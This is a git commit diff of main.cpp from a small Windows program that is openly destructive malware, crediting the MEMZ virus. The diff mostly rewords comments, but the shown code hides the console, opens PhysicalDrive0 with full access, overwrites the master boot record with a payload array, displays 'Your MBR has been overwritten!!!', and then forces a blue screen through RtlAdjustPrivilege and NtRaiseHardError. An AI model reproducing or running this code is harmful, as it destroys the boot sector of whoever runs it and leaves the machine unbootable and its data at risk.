4740e7d33160eefd5609706341f75f3a35170b13
Anas Fakhfakh <Anas.batal1@gmail.com>
2021-06-25 02:56:15 +0200

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -3,22 +3,21 @@
 int main()
 {
 	FreeConsole(); //Hide the console.
-	DWORD dw; //A tmp DW.
+	DWORD dw;
 	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	//Now we have a handle to our dear MBR.
 	//We're going now to overwrite it...
-	//Write the mbrData data into hDrive.
+	//Write the mbrData data to hDrive.
 	WriteFile(hDrive, mbrData, sizeof(mbrData), &dw, NULL);
 	//DONE!
 	//Now let's close the handle...
 	CloseHandle(hDrive);
-	//Do some payloads...
 	//Show a message box.
-	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFY", MB_OK | MB_ICONERROR);
+	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFICATION", MB_OK | MB_ICONERROR);
 	//If the user clicks OK, cause BSOD.
-	//Thanks to Leurak for his awesome virus, MEMZ!
-	HMODULE ntdll = LoadLibraryA("ntdll"); //Load NTDLL library.
-	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege"); //Some variables & stuff...
+	//Credit: Leurak
+	HMODULE ntdll = LoadLibraryA("ntdll"); //Load the NTDLL library.
+	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
@@ -26,6 +25,5 @@ int main()
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now cause BSOD.
 	}
-	//The computer should work fine after BSOD xD
 	return 0;
 }
